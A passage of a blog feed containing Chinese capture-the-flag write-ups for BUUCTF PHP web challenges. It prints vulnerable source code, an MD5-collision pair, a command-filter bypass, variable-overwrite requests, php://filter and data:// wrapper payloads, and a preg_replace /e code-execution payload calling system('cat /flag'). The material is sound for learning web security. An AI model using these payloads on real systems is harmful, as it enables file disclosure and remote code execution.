    <content type="html"><![CDATA[<h4 id="0x00知识点"><a href="#0x00知识点" class="headerlink" title="0x00知识点"></a>0x00知识点</h4><h5 id="MD5碰撞的一些例子"><a href="#MD5碰撞的一些例子" class="headerlink" title="MD5碰撞的一些例子"></a>MD5碰撞的一些例子</h5><p><a href="https://www.jianshu.com/p/c9089fd5b1ba">https://www.jianshu.com/p/c9089fd5b1ba</a></p><h5 id="PHP代码安全【PHP弱口令、加密函数、绕过函数】-CTF代码审计题"><a href="#PHP代码安全【PHP弱口令、加密函数、绕过函数】-CTF代码审计题" class="headerlink" title="PHP代码安全【PHP弱口令、加密函数、绕过函数】/CTF代码审计题"></a>PHP代码安全【PHP弱口令、加密函数、绕过函数】/CTF代码审计题</h5><p><a href="https://sp4rkw.blog.csdn.net/article/details/79088218">https://sp4rkw.blog.csdn.net/article/details/79088218</a></p><h4 id="0x01解题"><a href="#0x01解题" class="headerlink" title="0x01解题"></a>0x01解题</h4><p>靶机启动：</p><p><img src="/2021/08/08/buu/10/image-20210809085159186.png" alt="image-20210809085159186"></p><p>观察到url路径存在参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?img&#x3D;TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd&#x3D;</span><br></pre></td></tr></table></figure><p>感觉这里就是切入点，img背后的似乎是base64码</p><p>在线解码一下（<a href="https://base64.us/%EF%BC%89%EF%BC%9A">https://base64.us/）：</a></p><p>TXpVek5UTTFNbVUzTURabE5qYz0</p><p>MzUzNTM1MmU3MDZlNjc=</p><p>3535352e706e67</p><p>连续两次base64解码后，得到一串字符串</p><p>查了资料，这是hex编码</p><p><img src="/2021/08/08/buu/10/image-20210809085725782.png" alt="image-20210809085725782"></p><p>再次解码：得到555.png，有意思</p><p>刚好靶机页面上就有一张哭泣图片</p><p>我们猜测，img后面的多次编码的参数请求可以得到源码</p><p>按照上面的解码逆推编码，可以得到</p><p>index.php:</p><p>696E6465782E706870</p><p>Njk2RTY0NjU3ODJFNzA2ODcw</p><p>TmprMlJUWTBOalUzT0RKRk56QTJPRGN3</p><p>将参数修改</p><p><img src="/2021/08/08/buu/10/image-20210809090352667.png" alt="image-20210809090352667"></p><p>f12查看</p><p><img src="/2021/08/08/buu/10/image-20210809090426959.png" alt="image-20210809090426959"></p><p>对base64解码得到源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(&#39;content-type:text&#x2F;html;charset&#x3D;utf-8&#39;);</span><br><span class="line">$cmd &#x3D; $_GET[&#39;cmd&#39;];</span><br><span class="line">if (!isset($_GET[&#39;img&#39;]) || !isset($_GET[&#39;cmd&#39;])) </span><br><span class="line">    header(&#39;Refresh:0;url&#x3D;.&#x2F;index.php?img&#x3D;TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd&#x3D;&#39;);</span><br><span class="line">$file &#x3D; hex2bin(base64_decode(base64_decode($_GET[&#39;img&#39;])));</span><br><span class="line"></span><br><span class="line">$file &#x3D; preg_replace(&quot;&#x2F;[^a-zA-Z0-9.]+&#x2F;&quot;, &quot;&quot;, $file);</span><br><span class="line">if (preg_match(&quot;&#x2F;flag&#x2F;i&quot;, $file)) &#123;</span><br><span class="line">    echo &#39;&lt;img src &#x3D;&quot;.&#x2F;ctf3.jpeg&quot;&gt;&#39;;</span><br><span class="line">    die(&quot;xixi～ no flag&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $txt &#x3D; base64_encode(file_get_contents($file));</span><br><span class="line">    echo &quot;&lt;img src&#x3D;&#39;data:image&#x2F;gif;base64,&quot; . $txt . &quot;&#39;&gt;&lt;&#x2F;img&gt;&quot;;</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo $cmd;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">if (preg_match(&quot;&#x2F;ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#39;|\&quot;|\&#96;|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;&#x2F;i&quot;, $cmd)) &#123;</span><br><span class="line">    echo(&quot;forbid ~&quot;);</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    if ((string)$_POST[&#39;a&#39;] !&#x3D;&#x3D; (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) &#x3D;&#x3D;&#x3D; md5($_POST[&#39;b&#39;])) &#123;</span><br><span class="line">        echo &#96;$cmd&#96;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo (&quot;md5 is funny ~&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h5 id="代码审计："><a href="#代码审计：" class="headerlink" title="代码审计："></a>代码审计：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(&quot;&#x2F;ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#39;|\&quot;|\&#96;|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;&#x2F;i&quot;, $cmd</span><br></pre></td></tr></table></figure><p>这里对cmd的值进行了正则过滤，一般的l像s指令都不可以用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if ((string)$_POST[&#39;a&#39;] !&#x3D;&#x3D; (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) &#x3D;&#x3D;&#x3D; md5($_POST[&#39;b&#39;])) &#123;</span><br><span class="line">       echo &#96;$cmd&#96;;</span><br><span class="line">   &#125; else &#123;</span><br><span class="line">       echo (&quot;md5 is funny ~&quot;);</span><br></pre></td></tr></table></figure><p>这里说明我们需要POST两个变量：a和b</p><p>它们作为字符串时的值弱比较不相等，md5加密的值强比较要相等（<strong>md5碰撞</strong>）</p><p>这里不太理解，所以先直接抄了wp的md5值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure><p>POST传参</p><p>这里最好不要用hackbar，因为hackbar好像会把md5值再编码</p><p>（这个地方坑了我好久）</p><p>在请求到包后，直接在bp里改包</p><p>原来的GET请求直接改成POST请求</p><p><img src="/2021/08/08/buu/10/image-20210809092901502.png" alt="image-20210809092901502"></p><p>使用还没被ban掉的dir指令</p><p>查询到文件</p><p><img src="/2021/08/08/buu/10/image-20210809092634318.png" alt="image-20210809092634318"></p><p>然后直接用了多数博客都使用的绕过方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd&#x3D;ca\t%20&#x2F;flag</span><br></pre></td></tr></table></figure><p><img src="/2021/08/08/buu/10/image-20210809093215609.png" alt="image-20210809093215609"></p><p>看网上还有一种方法读取flag：</p><p>sort命令：sort将文件的每一行作为一个单位，相互比较，比较原则是从首字符向后，依次按ASCII码值进行比较，最后将他们按升序输出。</p><p><img src="/2021/08/08/buu/10/1625650-20200130214928556-987685402.png" alt="img"></p><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p><a href="https://www.cnblogs.com/wangtanzhi/p/12244096.html">https://www.cnblogs.com/wangtanzhi/p/12244096.html</a></p><p><a href="https://blog.csdn.net/qq_43622442/article/details/106012150">https://blog.csdn.net/qq_43622442/article/details/106012150</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;0x00知识点&quot;&gt;&lt;a href=&quot;#0x00知识点&quot; class=&quot;headerlink&quot; title=&quot;0x00知识点&quot;&gt;&lt;/a&gt;0x00知识点&lt;/h4&gt;&lt;h5 id=&quot;MD5碰撞的一些例子&quot;&gt;&lt;a href=&quot;#MD5碰撞的一些例子&quot; class=&quot;head</summary>
      
    
    
    
    
    <category term="buu" scheme="http://daweitech.github.io/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>BJDCTF2020 Mark loves cat</title>
    <link href="http://daweitech.github.io/2021/08/07/buu/9/"/>
    <id>http://daweitech.github.io/2021/08/07/buu/9/</id>
    <published>2021-08-07T02:07:01.000Z</published>
    <updated>2021-08-07T08:06:04.188Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x00知识点"><a href="#0x00知识点" class="headerlink" title="0x00知识点"></a>0x00知识点</h4><ol><li><h5 id="git源码泄露；"><a href="#git源码泄露；" class="headerlink" title=".git源码泄露；"></a>.git源码泄露；</h5></li><li><h5 id="导致变量覆盖漏洞（参考CTF之php变量覆盖漏洞）"><a href="#导致变量覆盖漏洞（参考CTF之php变量覆盖漏洞）" class="headerlink" title="$$导致变量覆盖漏洞（参考CTF之php变量覆盖漏洞）"></a><code>$$</code>导致变量覆盖漏洞（参考<a href="https://www.jianshu.com/p/a4d782e91852">CTF之php变量覆盖漏洞</a>）</h5></li></ol><h4 id="0x01解题"><a href="#0x01解题" class="headerlink" title="0x01解题"></a>0x01解题</h4><p>靶机启动：</p><p><img src="/2021/08/07/buu/9/image-20210807153209853.png" alt="image-20210807153209853"></p><p>没有什么有用信息</p><p>扫描一下目录</p><p><img src="/2021/08/07/buu/9/image-20210807102252828.png" alt="image-20210807102252828"></p><p><img src="/2021/08/07/buu/9/image-20210807102702092.png" alt="image-20210807102702092"></p><p>（调低线程后）</p><p><img src="/2021/08/07/buu/9/image-20210807110900544.png" alt="image-20210807110900544"></p><p>发现存在flag.php</p><p>我们再用GitHack下载下来。</p><p>得到两个文件index.php和flag.php</p><h5 id="index-php"><a href="#index-php" class="headerlink" title="index.php:"></a>index.php:</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#39;flag.php&#39;;</span><br><span class="line"></span><br><span class="line">$yds &#x3D; &quot;dog&quot;;</span><br><span class="line">$is &#x3D; &quot;cat&quot;;</span><br><span class="line">$handsome &#x3D; &#39;yds&#39;;</span><br><span class="line"></span><br><span class="line">foreach($_POST as $x &#x3D;&gt; $y)&#123;</span><br><span class="line">    $$x &#x3D; $y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach($_GET as $x &#x3D;&gt; $y)&#123;</span><br><span class="line">    $$x &#x3D; $$y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach($_GET as $x &#x3D;&gt; $y)&#123;</span><br><span class="line">    if($_GET[&#39;flag&#39;] &#x3D;&#x3D;&#x3D; $x &amp;&amp; $x !&#x3D;&#x3D; &#39;flag&#39;)&#123;</span><br><span class="line">        exit($handsome);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(!isset($_GET[&#39;flag&#39;]) &amp;&amp; !isset($_POST[&#39;flag&#39;]))&#123;</span><br><span class="line">    exit($yds);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if($_POST[&#39;flag&#39;] &#x3D;&#x3D;&#x3D; &#39;flag&#39;  || $_GET[&#39;flag&#39;] &#x3D;&#x3D;&#x3D; &#39;flag&#39;)&#123;</span><br><span class="line">    exit($is);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo &quot;the flag is: &quot;.$flag;</span><br></pre></td></tr></table></figure><h5 id="代码审计："><a href="#代码审计：" class="headerlink" title="代码审计："></a>代码审计：</h5><h6 id="摘抄部分"><a href="#摘抄部分" class="headerlink" title="摘抄部分"></a>摘抄部分</h6><p><img src="/2021/08/07/buu/9/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjIyNDQy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>代码中的变量覆盖漏洞</strong></p><p><img src="/2021/08/07/buu/9/202005042321468.png" alt="在这里插入图片描述"></p><p><strong>尝试第一个exit处</strong>，</p><p>看注释，键名不能有flag，而且又要键名为flag的键值等于其中一个键名，你又要我不存在，又要我存在，进不去这个判断，告辞</p><p><img src="/2021/08/07/buu/9/1.jpg" alt="在这里插入图片描述"></p><p><strong>尝试第二个exit处</strong></p><p>我们想要通过单纯的post参数搞定它是不可能的，因为post处的变量覆盖是让它变成我们可控的值，所以搞不定。</p><p>所以可以通过单纯的get或者get+post搞定</p><p>可以看到这里是输出的$yds变量，那么我们就要通过变量覆盖达到$yds=$flag的效果</p><p>直接说答案比较好分析：get传参 yds=flag；<br>我们看看参数的传递流程：</p><p><img src="/2021/08/07/buu/9/20200504233307150.png" alt="在这里插入图片描述"></p><p><strong>分析：</strong></p><p>在这个里面，首先是 <strong>$x=yds,$=fla</strong>g 。把它带进foreach里面，就变成了$yds=$flag 。</p><p>**$$x就相当于是$($x)**，这样就非常好理解变量覆盖漏洞了。</p><h5 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?yds&#x3D;flag</span><br></pre></td></tr></table></figure><p><img src="/2021/08/07/buu/9/image-20210807155151631.png" alt="image-20210807155151631"></p><h5 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h5><p>这里是利用了exit($is)。</p><p>我们首先看看，要进入判断，执行exit($is)需要的条件，看注释。</p><p><img src="/2021/08/07/buu/9/20200504233744435.png" alt="在这里插入图片描述"></p><p>那我们就先从post型flag=flag开始：</p><p>我们post的数据，会在这一步，把原来的$flag的值改变，因为$x=flag,$y=flag，然后带进去变成了$flag=flag。</p><p>over，原来的flag值被我们整没了，这条路不通：</p><p><img src="/2021/08/07/buu/9/20200504233839775.png" alt="在这里插入图片描述"></p><p>我们试试get型的flag=flag：<br>（答案：is=flag&amp;flag=flag）</p><p><img src="/2021/08/07/buu/9/20200504234208601.png" alt="在这里插入图片描述"></p><p>首先分析变量覆盖处：</p><p>首先是$x=is,$y=flag,带进去就变成了$is=$flag;<br>现在到了第二个参数,$x=flag,$y=flag，带进去变成$flag=$flag，自己变成自己，没啥影响，没有改变flag 的值，成功。</p><p><img src="/2021/08/07/buu/9/image-20210807155750060.png" alt="image-20210807155750060"></p><h4 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h4><p>参考博客：</p><p> <a href="https://blog.csdn.net/jianpanliu/article/details/107028582">BJDCTF2020]Mark loves cat_qtL0ng的博客-CSDN博客</a></p><p><a href="https://blog.csdn.net/qq_43622442/article/details/105925473">BJDCTF2020]Mark loves cat (两种解法)（变量覆盖漏洞）_H9_dawn的博客-CSDN博客</a></p><p><a href="https://www.jianshu.com/p/a4d782e91852">CTF之php变量覆盖漏洞 - 简书 (jianshu.com)</a></p><p><a href="https://www.jianshu.com/p/a4d782e91852">CTF之php变量覆盖漏洞 - 简书 (jianshu.com)</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;0x00知识点&quot;&gt;&lt;a href=&quot;#0x00知识点&quot; class=&quot;headerlink&quot; title=&quot;0x00知识点&quot;&gt;&lt;/a&gt;0x00知识点&lt;/h4&gt;&lt;ol&gt;
&lt;li&gt;&lt;h5 id=&quot;git源码泄露；&quot;&gt;&lt;a href=&quot;#git源码泄露；&quot; class=</summary>
      
    
    
    
    
    <category term="buu" scheme="http://daweitech.github.io/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>BJDCTF2020 ZJCTF，不过如此</title>
    <link href="http://daweitech.github.io/2021/08/06/buu/8/"/>
    <id>http://daweitech.github.io/2021/08/06/buu/8/</id>
    <published>2021-08-05T23:36:02.000Z</published>
    <updated>2021-08-24T13:40:47.047Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-知识点"><a href="#0x00-知识点" class="headerlink" title="0x00 知识点"></a>0x00 知识点</h3><h4 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents:"></a>file_get_contents:</h4><p>file_get_contents函数把整个文件读入一个字符串中。</p><h5 id="语法："><a href="#语法：" class="headerlink" title="语法："></a>语法：</h5><p>file_get_contents(path,include_path,context,start,max_length)</p><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">path</td><td align="left">必需。规定要读取的文件。</td></tr><tr><td align="left">include_path</td><td align="left">可选。如果也想在 include_path 中搜寻文件的话，可以将该参数设为 “1”。</td></tr><tr><td align="left">context</td><td align="left">可选。规定文件句柄的环境。context 是一套可以修改流的行为的选项。若使用 null，则忽略。</td></tr><tr><td align="left">start</td><td align="left">可选。规定在文件中开始读取的位置。该参数是 PHP 5.1 新加的。</td></tr><tr><td align="left">max_length</td><td align="left">可选。规定读取的字节数。该参数是 PHP 5.1 新加的。</td></tr></tbody></table><h5 id="例子："><a href="#例子：" class="headerlink" title="例子："></a>例子：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo file_get_contents(&quot;test.txt&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">This is a test file with test text.</span><br></pre></td></tr></table></figure><h4 id="text-plain"><a href="#text-plain" class="headerlink" title="text/plain"></a>text/plain</h4><p><a href="https://www.cnblogs.com/soundcode/p/4572251.html">text/html与text/plain有什么区别？ - 左正 - 博客园 (cnblogs.com)</a></p><p>text/plain的意思是将文件设置为纯文本的形式，浏览器在获取到这种文件时并不会对其进行处理。</p><h4 id="PHP伪协议中的data-协议"><a href="#PHP伪协议中的data-协议" class="headerlink" title="PHP伪协议中的data://协议"></a>PHP伪协议中的data://协议</h4><p>摘抄于：<a href="https://blog.csdn.net/qq_46091464/article/details/106665358">文件包含漏洞之PHP伪协议中的data://的那些事~_Firebasky的博客-CSDN博客</a></p><h5 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;include.php</span><br><span class="line">&lt;?php</span><br><span class="line">    @$file  &#x3D; $_GET[&#39;file&#39;];</span><br><span class="line">    @include($file);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>payload1：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure><p><strong>无法使用</strong></p><p>payload2：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpOz8+</span><br></pre></td></tr></table></figure><p><strong>无法使用</strong></p><p>payload3：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,*PD9waHAgc3lzdGVtKCJkaXIiKTs&#x2F;Pg&#x3D;&#x3D;*</span><br></pre></td></tr></table></figure><p><strong>可以使用</strong></p><p>总结：<br>通过实验发现这个可能是编码的问题因为<?php phpinfo();?>在编成base64的时候出现了+。而浏览器不认识+号。所以解决方法</p><p>1.不写后面的?&gt; 因为PHP里面其实不需要写后面的 前面的；号就已经说明结束了。如果没有；号就必须写?&gt;作为结束。</p><p>2.添加空格改变base64编码。</p><p>3.将+号换成%2b</p><p>所以其实不需要通过base64编码来实现！！！<br>将<?php phpinfo();?>改变成url编码。这样浏览器可以识别！<br><img src="/2021/08/06/buu/8/20200610150733928.png" alt="在这里插入图片描述"></p><h4 id="php-filter协议"><a href="#php-filter协议" class="headerlink" title="php://filter协议"></a>php://filter协议</h4><p>摘抄于：</p><p><a href="https://blog.csdn.net/destiny1507/article/details/82347371">php://filter 的使用_hhh-CSDN博客</a></p><p>​    php://filter 是php中独有的一个协议，可以作为一个中间流来处理其他流，可以进行任意文件的读取；</p><p>​    根据名字，filter，可以很容易想到这个协议可以用来过滤一些东西；</p><p>构造：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;recource&#x3D;index.php</span><br></pre></td></tr></table></figure><p>​    这句话的意思是我们用base64编码的方式来读文件index.php；</p><p>​    这时页面会显示出源文件index.php经过base64编码后的内容，然后经过base64解码就可以看到flag；</p><p><strong>总之呢，php://filter协议有一下几个应用：</strong></p><p>1、利用base64获得源码</p><p>2、通过读写编码实行绕过操作</p><p><strong>问：为什么需要用base64才可以看到源码 如果本地源码是明文的话那是不是不用过滤器</strong>？</p><p>​    include一个文件中有php代码会进行php解析，如果是明文，则会直接返回明文。用了过滤器，如果是php文件就不会解析，就可以拿到php文件的源码了</p><p>​    先把要读取的内容经过base64编码然后才能显示出来，之后我们再经过解码就可以是可读的了</p><h4 id="preg-replace（）函数"><a href="#preg-replace（）函数" class="headerlink" title="preg_replace（）函数"></a>preg_replace（）函数</h4><p>文章：<a href="https://xz.aliyun.com/t/2557">深入研究preg_replace与代码执行 - 先知社区 (aliyun.com)</a></p><h3 id="0x01-解题"><a href="#0x01-解题" class="headerlink" title="0x01 解题"></a>0x01 解题</h3><p><img src="/2021/08/06/buu/8/image-20210806084045764.png" alt="image-20210806084045764"></p><p>代码内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">$text &#x3D; $_GET[&quot;text&quot;];</span><br><span class="line">$file &#x3D; $_GET[&quot;file&quot;];</span><br><span class="line">if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)&#x3D;&#x3D;&#x3D;&quot;I have a dream&quot;))&#123;</span><br><span class="line">  echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#39;r&#39;).&quot;&lt;&#x2F;h1&gt;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">  if(preg_match(&quot;&#x2F;flag&#x2F;&quot;,$file))&#123;</span><br><span class="line">    die(&quot;Not now!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  include($file); &#x2F;&#x2F;next.php</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">  highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>传两个参数，text和file，之间用&amp;连接即可</p><p>目的是获得下列提示的    next.php</p><p>要满足传入的文件内容为：I have a dream</p><p>使用php伪协议中的data:协议和php的filter:协议</p><p>构造：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,I have a dream&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;next.php</span><br></pre></td></tr></table></figure><p><img src="/2021/08/06/buu/8/image-20210806083956451.png" alt="image-20210806083956451"></p><p>解码后代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$id &#x3D; $_GET[&#39;id&#39;];</span><br><span class="line"></span><br><span class="line">$_SESSION[&#39;id&#39;] &#x3D; $id;</span><br><span class="line"></span><br><span class="line">function complex($re, $str) &#123;</span><br><span class="line"></span><br><span class="line">  return preg_replace(</span><br><span class="line"></span><br><span class="line">​    &#39;&#x2F;(&#39; . $re . &#39;)&#x2F;ei&#39;,</span><br><span class="line"></span><br><span class="line">​    &#39;strtolower(&quot;\\1&quot;)&#39;,</span><br><span class="line"></span><br><span class="line">​    $str</span><br><span class="line"></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach($_GET as $re &#x3D;&gt; $str) &#123;</span><br><span class="line"></span><br><span class="line">  echo complex($re, $str). &quot;\n&quot;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function getFlag()&#123;</span><br><span class="line"></span><br><span class="line">  @eval($_GET[&#39;cmd&#39;]);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现 preg_replace（）函数是一个代码执行的问题</p><p>发现这是用固定解题格式： <strong>\S*=${}</strong></p><p><strong>payload1</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">next.php?\S*&#x3D;$&#123;getFlag()&#125;&amp;cmd&#x3D;system(&#39;cat &#x2F;flag&#39;);</span><br></pre></td></tr></table></figure><p><img src="/2021/08/06/buu/8/image-20210806091905315.png" alt="image-20210806091905315"></p><p><strong>payload2</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">next.php?\S*&#x3D;$&#123;eval($_POST[cmd])&#125;</span><br></pre></td></tr></table></figure><p>输错就会·提示相关函数过滤（这里我是斜杆的符号方向输错导致被匹配过滤）</p><p><img src="/2021/08/06/buu/8/image-20210806092259983.png" alt="image-20210806092259983"></p><p>上传成功：</p><p><img src="/2021/08/06/buu/8/image-20210806092509267.png" alt="image-20210806092509267"></p><p><img src="/2021/08/06/buu/8/image-20210806092557240.png" 